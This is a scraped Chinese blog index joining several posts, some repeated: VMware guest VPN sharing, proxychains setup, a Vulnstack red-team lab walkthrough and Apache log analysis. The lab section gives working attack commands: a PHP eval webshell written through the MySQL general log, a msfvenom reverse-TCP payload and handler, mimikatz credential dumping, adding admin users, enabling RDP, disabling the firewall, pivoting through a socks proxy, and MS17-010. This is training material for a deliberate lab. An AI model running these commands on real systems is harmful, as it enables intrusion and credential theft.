原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#主机windows配置-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#虚拟机linux配置-1"},{"categories":["linux"],"content":"\r写在文章的最后：给出的这两种方法还是比较麻烦的，文章进行到一半的时候，charmersix师傅便提供了另一种更为简便的方法，所以本文的第二种方法是直接拉取了知乎上kevinkangkang师傅的原文。具体charmersix给出的方法在VMware虚拟机中的Kali Linux通过物理机代理实现科学上网这篇文章 ","date":"2023-11-17","objectID":"/vmware_vpn/:3:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#写在文章的最后"},{"categories":["linux"],"content":"VMware虚拟机通过物理机的vpn代理实现科学上网 接上一篇文章，先把原理搞通，实践起来会顺畅一些 这种方法相对简单很多，免去了部分繁琐的参数配置，随开随用，不影响其他进程的上网 环境：VMware中运行的Kali Linux 工具：proxychains4（kali）、v2ray（物理机） ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:0","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#"},{"categories":["linux"],"content":"\r首先在物理机中配置v2ray\r设置–\u003e参数设置 本地监听端口10808，勾选划线部分 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:1","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#首先在物理机中配置v2ray"},{"categories":["linux"],"content":"\r然后进行vmware的配置\r勾选，同时知悉VMware网络NAT模式走的网卡在物理机的终端中名为VMware8，同时在物理机终端输入ipconfig查询该虚拟网卡的ip地址 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:2","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#然后进行vmware的配置"},{"categories":["linux"],"content":"\r接下来是VMware虚拟机中kali的配置\rproxychains ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:3","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#接下来是vmware虚拟机中kali的配置"},{"categories":["linux"],"content":"\r接下来是VMware虚拟机中kali的配置\rproxychains ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:3","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#proxychains"},{"categories":["linux"],"content":"\r0x1简介与安装ProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。ProxyChains 只会将当前应用的 TCP 连接转发至代理，而非全局代理。 git clone https://github.com/rofl0r/proxychains-ng cd proxychains-ng ./configure sudo make \u0026\u0026 make install ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:4","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#0x1简介与安装"},{"categories":["linux"],"content":"\r0x2配置与使用ProxyChains 的配置文件位于 /etc/proxychains.conf ，打开后在末尾添加的代理。 [ProxyList] # add proxy here ... # meanwile # defaults set to \"tor\" #socks4 127.0.0.1 9050 # example socks5 127.0.0.1 8888 proxychains 使用命令形式为： proxychains \u003c运行的命令\u003e \u003c命令参数\u003e ProxyChains 的使用方式非常简单，直接在应用程序前加上 proxychains4 即可。例如： proxychains4 git clone https://github.com/rofl0r/proxychains-ng 除此之外也可以在任何应用上使用： sudo proxychains4 apt-get update proxychains4 npm install 然而，不能这样使用 proxychains4 ping google.com [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.dylib PING google.com (172.217.27.142): 56 data bytes Request timeout for icmp_seq 0 Request timeout for icmp_seq 1 Request timeout for icmp_seq 2 Request timeout for icmp_seq 3 Request timeout for icmp_seq 4 因为 proxychains 只会代理 TCP 连接，而 ping 使用的是 ICMP。 [其他配置]**dynamic_chain：**该配置项能够通过 ProxyList 中的每个代理运行流量，如果其中一 个代理关闭或者没有响应，它能够自动选择 ProxyList 中的下一个代理； **strict_chain：**改配置为 ProxyChains 的默认配置，不同于 dynamic_chain，也能够通 过 ProxyList 中的每个代理运行流量，但是如果 ProxyList 中的代理出现故障，不会自动 切换到下一个。 **random_chain：**该配置项会从 ProxyList 中随机选择代理 IP 来运行流量，如果 ProxyList 中有多个代理 IP，在使用 proxychains 的时候会使用不同的代理访问目标主机， 从而使主机端探测流量更加困难。 特别注意的是 v2ray对局域网进行监听的端口是10810(socks协议)，在proxychains的配置文件中不要写成10808 保存退出，就可以直接使用了，注意，由于新版kali的权限安全限制，使用proxychains不能是root用户 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:5","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#0x2配置与使用"},{"categories":["linux"],"content":"\r0x2配置与使用ProxyChains 的配置文件位于 /etc/proxychains.conf ，打开后在末尾添加的代理。 [ProxyList] # add proxy here ... # meanwile # defaults set to \"tor\" #socks4 127.0.0.1 9050 # example socks5 127.0.0.1 8888 proxychains 使用命令形式为： proxychains \u003c运行的命令\u003e \u003c命令参数\u003e ProxyChains 的使用方式非常简单，直接在应用程序前加上 proxychains4 即可。例如： proxychains4 git clone https://github.com/rofl0r/proxychains-ng 除此之外也可以在任何应用上使用： sudo proxychains4 apt-get update proxychains4 npm install 然而，不能这样使用 proxychains4 ping google.com [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.dylib PING google.com (172.217.27.142): 56 data bytes Request timeout for icmp_seq 0 Request timeout for icmp_seq 1 Request timeout for icmp_seq 2 Request timeout for icmp_seq 3 Request timeout for icmp_seq 4 因为 proxychains 只会代理 TCP 连接，而 ping 使用的是 ICMP。 [其他配置]**dynamic_chain：**该配置项能够通过 ProxyList 中的每个代理运行流量，如果其中一 个代理关闭或者没有响应，它能够自动选择 ProxyList 中的下一个代理； **strict_chain：**改配置为 ProxyChains 的默认配置，不同于 dynamic_chain，也能够通 过 ProxyList 中的每个代理运行流量，但是如果 ProxyList 中的代理出现故障，不会自动 切换到下一个。 **random_chain：**该配置项会从 ProxyList 中随机选择代理 IP 来运行流量，如果 ProxyList 中有多个代理 IP，在使用 proxychains 的时候会使用不同的代理访问目标主机， 从而使主机端探测流量更加困难。 特别注意的是 v2ray对局域网进行监听的端口是10810(socks协议)，在proxychains的配置文件中不要写成10808 保存退出，就可以直接使用了，注意，由于新版kali的权限安全限制，使用proxychains不能是root用户 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:5","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#其他配置"},{"categories":["penetration"],"content":"Vulnstack-ATT\u0026CK(一) ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#"},{"categories":["penetration"],"content":"\r0x1前言红日靶场 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 靶机初始密码 均为 hongrisec@2019 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x1前言"},{"categories":["penetration"],"content":"\r0x2环境搭建 攻击机 kali ip 192.168.157.137 web服务器 win7 ip 192.168.157.153 192.168.52.143 域成员 win2003 ip **** 192.168.52.141 域控 win2008 ip **** 192.168.52.138 ​ 靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。 ​ 我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。 ​ 在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x2环境搭建"},{"categories":["penetration"],"content":"\r0x3web渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x3web渗透"},{"categories":["penetration"],"content":"\r1.信息收集","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#1信息收集"},{"categories":["penetration"],"content":"\r探测内网存活 netdiscover -i eth0 -r 192.168.60.0/24 目标靶机ip为192.168.60.128 (254是DHCP服务器地址) ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:1","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#探测内网存活"},{"categories":["penetration"],"content":"\r端口扫描\u0026及目录爆破 nmap 192.168.60.130 （启用了DHCP服务，重启后ip发生变化） 这是一般情况下的扫描结果，只能探测到80和3306端口 下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口 进一步探测 nmap -sC -sV -Pn -p 1-65535 192.168.60.130 常用扫描工具有：dirsearch、dirmap、御剑，kali自带的dirbuster、nikto，使用多个扫描工具进行探测，可能会发现不同的扫描结果。 开启了80端口，我们可以访问一下 页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功 御剑爆网站目录 dirsearch爆网站目录 扫描工具很多，能不能扫出有用信息还是看字典是否强大。 另外我们还可以通过nikto扫描来获取相关信息 nikto -h 192.168.60.130 发现后台页面路径 尝试root/root也能登上 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:2","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#端口扫描及目录爆破"},{"categories":["penetration"],"content":"\r2.利用sql写文件getshell一般利用mysql获取shell的方法有以下几种： select ‘一句话木马’ into dumpfile/outfile ‘绝对路径’ 条件1：secure_file_priv变量非NULL，表示支持数据导入导出 条件2：用户拥有root权限 条件3：知道当前网站的绝对路径 利用日志文件 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#2利用sql写文件getshell"},{"categories":["penetration"],"content":"\r判断步骤如下：查看secure-file-priv值，为NULL时表示禁止导入导出，且无法通过sql语句对该属性值进行修改，说明第1种方式行不通 我们可以通过以下sql语句进行查询 show variables like \"%secure%\"; 可见secure_file_priv的值为null，要想修改 Value值 只能修改配置文件 mysql.ini(linux修改配置文件：my.cnf)，所以第一种方法行不通 查看是否开启日志记录以及日志保存目录 SHOW VARIABLES LIKE '%general_log%' 为OFF，但可使用SET语句设置为ON set global general_log =\"on\"; 并将日志保存路径设置为php文件 set global general_log_file=\"C:/phpStudy/www/1.php\"; 再执行一条一句话木马语句，该语句会被记录到日志文件中 select '\u003c?php eval($_POST[\"cmd\"]);?\u003e'; 此时，我们已经成功将一句话木马写入主机，然后就可以使用蚁剑或菜刀进行连接，成功getshell ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:1","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#判断步骤如下"},{"categories":["penetration"],"content":"\r另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)\r登录后可对网站整体内容进行管理，其中可以对模板文件进行编辑，这样就可以向模板文件中增加一句话木马进行连接来getshell。 直接用蚁剑连就可以了 同时该cms还存在xss、sql注入等漏洞，但利用价值不大 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:2","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#另外我们也可以通过扫描到的cms管理页面进行getshell账密网站页面直接写了"},{"categories":["penetration"],"content":"\r3.(拿下webshell后信息收集)内网信息收集到目前为止，相当于我们已经获取了Win7的控制权，如果想进一步对内网段中其他主机的控制权，便需要进一步收集信息。例如，网段名、域用户、域控IP、管理员信息等等。而内网渗透的终极目标就是控制域控服务器，进而控制整个内网段。 内网信息收集可以考虑以下几种方式： 1.直接在蚁剑中打开终端执行命令–\u003e相当于是在win7的终端上执行各种命令 2.利用蚁剑上传msf反弹木马，执行后反弹shell到msf，在msf中执行命令–\u003e可以利用msf封装的其他命令，但该工具的优点在于一台机器的不断渗透，缺点是有点不稳定，容易掉线。 3.利用蚁剑上传CS反弹木马，执行后反弹shell到CS，然后在CS中执行命令–\u003e可以利用CS提供的其他命令，能较方便的获取同内网其他主机的信息，并获取其他主机的控制权，但是命令执行后的结果返回特别慢，所以如果仅仅是执行一些收集主机信息的命令，建议不要用CS。 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#3拿下webshell后信息收集内网信息收集"},{"categories":["penetration"],"content":"\r基本信息收集常用命令： ipconfig /all 查看本机ip，所在域 route print 打印路由信息 net view 查看局域网内其他主机名 arp -a 查看arp缓存 net start 查看开启了哪些服务 net share 查看开启了哪些共享 net share ipc$ 开启ipc共享 net share c$ 开启c盘共享 net use \\\\192.168.xx.xx\\ipc$ \"\" /user:\"\" 与192.168.xx.xx建立空连接 net use \\\\192.168.xx.xx\\c$ \"密码\" /user:\"用户名\" 建立c盘共享 dir \\\\192.168.xx.xx\\c$\\user 查看192.168.xx.xx c盘user目录下的文件 net config Workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 net user 查看本机用户列表 net user /domain 查看域用户 net localgroup administrators 查看本地管理员组（通常会有域用户） net view /domain 查看有几个域 net user 用户名 /domain 获取指定域用户的信息 net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group 组名 /domain 查看域中某工作组 net group \"domain admins\" /domain 查看域管理员的名字 net group \"domain computers\" /domain 查看域中的其他主机名 net group \"doamin controllers\" /domain 查看域控制器（可能有多台） netstat -ano | find \"3389\" 查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows） REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 用于开启远程桌面登录 尝试远程桌面登录 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:1","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#基本信息收集"},{"categories":["penetration"],"content":"\r尝试远程桌面登录判断3389端口是否开放 netstat -ano| find \"3389\" 在蚁剑shell执行，发现并没有，这里猜测是被防火墙屏蔽了 在蚁剑shell输入一下命令，尝试开放3389端口 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 新建用户名，并添加到管理员组 net user 查看用户账号名 net user username password /add 新建用户 net localgroup administrators username /add 将新用户添加到管理员组 ps：要注意这里新建用户时，新用户的密码有强度限制，如果设置的太简单将无法添加。 rdp连不上，可能是被防火墙屏蔽了 关闭防火墙 netsh advfirewall set allprofiles state off 随后就可以连接了 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:2","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#尝试远程桌面登录"},{"categories":["penetration"],"content":"\r0x4后渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x4后渗透"},{"categories":["penetration"],"content":"\rmsf上线这里的思路是将shell派送给CS或者msf进行下一步渗透。 使用msf生成exe并开启监听(也可以用cs生产exe)： msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.126.129 LPORT=2333 -f exe -o /root/run.exe **tips：**这边的locaohost(lhost)是攻击机kali的ip地址，千万不要填成靶机ip 通过蚁剑上传并执行 在shell里执行run.exe 在kali中进入msf相关模块: msfconsole use multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost 192.168.126.129 set lport 2333 exploit -j(后台)允许 随后通过sessions命令来查看反弹回来的shell 随后sessions -i 1进入这个session ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#msf上线"},{"categories":["penetration"],"content":"\r提权system：这里已经是system权限了，如果是administrator的话，需要先提权getsystem 一般提权流程： sysinfo getuid (发现是administor权限) getsystem (获取system权限) 随后获取账号密码： run hashdump 不知道为啥我除了一堆报错 除了hashdump，msf提供了一个用来获取域内用户hash的脚本，执行以下代码： run post/windows/gather/smart_hashdump 然后把mimikatz上传到靶机 upload /root/mimikatz.exe C:\\\\ //然后进入靶机的shell，运行mimikatz 对mimikatz进行提权 privilege::debug ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:1","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#提权system"},{"categories":["penetration"],"content":"\r抓取密码 sekurlsa::logonPasswords 看了其他大佬的博客，发现有更方便的方法： 1.导入账号密码hash值： run hashdump 2.mimikatz 加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程(需要system权限)： ps migrate PID load mimikatz mimikatz_command -f sekurlsa::searchPasswords 3.kiwi load wiki creds_all ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:2","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#抓取密码"},{"categories":["penetration"],"content":"\r开启3389 run post/windows/manage/enable_rdp ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:3","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#开启3389"},{"categories":["penetration"],"content":"\r内网搜集 ipconfig 看到win7的另一个网卡的ip (中文字符编码问题出现的乱码，将就看吧) //解决乱码问题 chcp 65001 使用ipconfig /all查看DNS服务器，推测DNS服务器名为god.org： 查看域信息：net view 查看主域信息：net view /domain ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:4","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#内网搜集"},{"categories":["penetration"],"content":"\r0x5横向渗透","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#0x5横向渗透"},{"categories":["penetration"],"content":"\r添加路由查看路由信息，添加路由到目标网络，以此使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到内网 查看目标机器所在内网网端信息与公网网端信息： run get_local_subnets 添加内网路由 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段： run autoroute -s 192.168.52.0/24 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:1:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#添加路由"},{"categories":["penetration"],"content":"\r扫描192.168.52.0/24网段： run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:2:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#扫描19216852024网段"},{"categories":["penetration"],"content":"\r扫描存活主机:先从win7的meterpreter session中退出来，执行： use auxiliary/scanner/netbios/nbname set rhosts 192.168.52.130 run ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:3:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#扫描存活主机"},{"categories":["penetration"],"content":"\r内网端口信息： use auxiliary/scanner/portscan/tcp ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:4:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#内网端口信息"},{"categories":["penetration"],"content":"\r挂socks4a代理挂代理是为了让其他工具能够通过win7 ，去访问192.168.52.0/24 网段 配置msf代理： use auxiliary/server/socks_proxy show options set version 4a show options set srvport 1080 run 如果proxychains配置终端代理出现问题 修改一下文件/etc/proxychains4.config 再开一个终端nano编辑proxychains4.config，把端口改成1080，记得用root身份 设置代理成功后 使用其他工具时需要添加proxychains ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:5:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#挂socks4a代理"},{"categories":["penetration"],"content":"\r渗透win2003(远程登录)","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#渗透win2003远程登录"},{"categories":["penetration"],"content":"\r信息收集扫描主机版本 use auxiliary/scanner/smb/smb_version set rhosts 192.168.52.141 run (emm，一开始没看到141就把前几个都扫了一遍。。。。) Nmap扫描 192.168.52.141 proxychains nmap -Pn -sT 192.168.52.141 ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:1","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#信息收集"},{"categories":["penetration"],"content":"\r尝试攻击由nmap看到开放445端口 尝试永恒之蓝攻击win2003 use exploit/windows/smb/ms17_010_psexec set payload windows/meterpreter/bind_tcp set rhosts 192.168.52.141 run 经过了几次尝试，没有打下来 可以尝试执行一些系统权限命令，比如添加管理员账户尝试3389登录 use auxiliary/admin/smb/ms17_010_command show options set rhosts 192.168.52.141 //添加用户 set command net user kun hongrisec@2019 /add //提升管理员权限 set command net localgroup administrators kun /add run //开启3389端口 set command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' run 然后使用proxychains4连接win2003的3389(kun用户登录) 。。。。。。。。。。 没搞完，先搁着吧 ​ ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:6:2","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#尝试攻击"},{"categories":["penetration"],"content":"\rmsf联动cobaltstrikemsf获取到shell后，可以派发给cobaltstrike 首先cobaltstrike创建监听器： ","date":"2023-11-17","objectID":"/vulnstack-attck_1/:0:0","series":null,"tags":["penetration"],"title":"Vulnstack-ATT\u0026CK(一)","uri":"/vulnstack-attck_1/#msf联动cobaltstrike"},{"categories":["web"],"content":"web流量审计与日志分析基础 ","date":"2023-11-17","objectID":"/log_analysis/:0:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#"},{"categories":["web"],"content":"\rweb日志分析基础：这里以Apache日志分析为例： Apache日志大致分为两类：访问日志和错误日志 ","date":"2023-11-17","objectID":"/log_analysis/:1:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#web日志分析基础"},{"categories":["web"],"content":"\r访问日志记录的过程： 客户端向web服务器发送请求，请求中包含客户端的IP、浏览器类型(User-Agent)、请示的URL等信息 web服务器向客户端返回请示的页面 web服务器同时将访问信息和状态信息记录到日志文件中 Apache的访问日志目录在其配置文件中已经定义好了，CentOS中apache的配置文件位置为/etc/httpd/conf/httpd.conf,默认的访问日志存放在/var/log/httpd/access_log中 我的站点面是用宝塔创建的，具体站点Apache日志在上面的图片中可见 ","date":"2023-11-17","objectID":"/log_analysis/:1:1","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#访问日志记录的过程"},{"categories":["web"],"content":"\r访问日志格式分析:apache中访问日志功能由mod_log_config模块提供，以默认的CLF来记录访问日志，如LogFormat “%h%l%u%t %r” 付一张图片，来自我的公网服务器网站Apache流量 ","date":"2023-11-17","objectID":"/log_analysis/:1:2","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#访问日志格式分析"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 